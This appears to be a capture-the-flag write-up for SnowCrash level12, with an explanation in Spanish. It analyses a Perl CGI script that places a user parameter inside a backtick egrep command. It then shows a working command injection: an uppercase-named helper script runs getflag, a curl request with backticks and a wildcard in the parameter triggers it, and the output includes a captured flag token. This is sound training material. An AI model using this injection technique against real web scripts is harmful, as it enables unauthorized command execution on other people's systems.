1. **File Search**

    We found a `level12.pl` file that shows Perl code that does the following:
    - Receives two web parameters: `x` and `y`.
    - Searches in `/xd` for lines that start with the value of `x` (uppercase and without spaces).
    - If the second part of the line matches `y` (as a regex), it prints `..`, otherwise it prints `.`
    1. The script uses the following line to search in the `/xd` file:
        ```bash
        @output = `egrep "^$xx" /tmp/xd 2>&1`;
        ```
        The value of `$xx` comes directly from the `x` parameter received by the user, after converting it to uppercase and removing what follows a space.

2. **Vulnerability and Exploitation**

    The `level12.pl` script is vulnerable to command injection because it inserts the value of the `x` parameter directly into a shell command using backticks, after converting it to uppercase and removing what follows a space. This allows arbitrary commands to be executed if the executable file name is in uppercase and contains no spaces.
    1. We create an executable script /tmp/EXPLOIT that executes getflag and redirects the output to a file (/tmp/flag12).
    2. We use an HTTP request with curl so that the CGI executes our script using a wildcard and backticks in the x parameter:
    ```bash
    level12@SnowCrash:~$ cd /tmp
    level12@SnowCrash:/tmp$ echo -e \'#!/bin/bash\\ngetflag > /tmp/flag12\' > EXPLOIT
    level12@SnowCrash:/tmp$ chmod +x EXPLOIT
    level12@SnowCrash:/tmp$ curl "http://localhost:4646/?x=\`/*/EXPLOIT\`&y=.*"
    ..level12@SnowCrash:/tmp$ cat flag12
    Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
    ```





## Lo que hace el script:

### 1. **Recibe dos parámetros de la web:**
- `x` = un texto (por ejemplo: "admin")
- `y` = otro texto (por ejemplo: "password")

### 2. **Procesa el parámetro `x`:**
```perl
$xx =~ tr/a-z/A-Z/;    # Convierte "admin" → "ADMIN"
$xx =~ s/\s.*//;       # Si hubiera espacios, los quita
```

### 3. **Busca en el archivo `/tmp/xd`:**
```perl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```
**Busca líneas que EMPIECEN con "ADMIN"**

### 4. **Ejemplo del archivo `/tmp/xd`:**
```
ADMIN:secretpassword
USER:mypass123
ADMIN:password456
GUEST:welcome
ROOT:topsecret
```

### 5. **El egrep encuentra:**
```
ADMIN:secretpassword
ADMIN:password456
```

### 6. **Ahora verifica el parámetro `y`:**
```perl
foreach $line (@output) {
    ($f, $s) = split(/:/, $line);  # Divide por ":"
    if($s =~ $nn) {                # ¿La parte después de ":" contiene "y"?
        return 1;
    }
}
```

## Ejemplo completo:

**Si el usuario pone:**
- `x = "admin"`
- `y = "password"`

**El script hace:**
1. Convierte "admin" → "ADMIN"
2. Busca líneas que empiecen con "ADMIN" en el archivo /tmp/xd
3. Encuentra: `ADMIN:secretpassword` y `ADMIN:password456`
4. Verifica si "password" está en "secretpassword" → ✅ SÍ
5. Devuelve 1 → Imprime ".."

## Resumen correcto:
**El script busca líneas que empiecen con `x`, y luego verifica si alguna de esas líneas contiene `y` en la parte después de los dos puntos (:)**

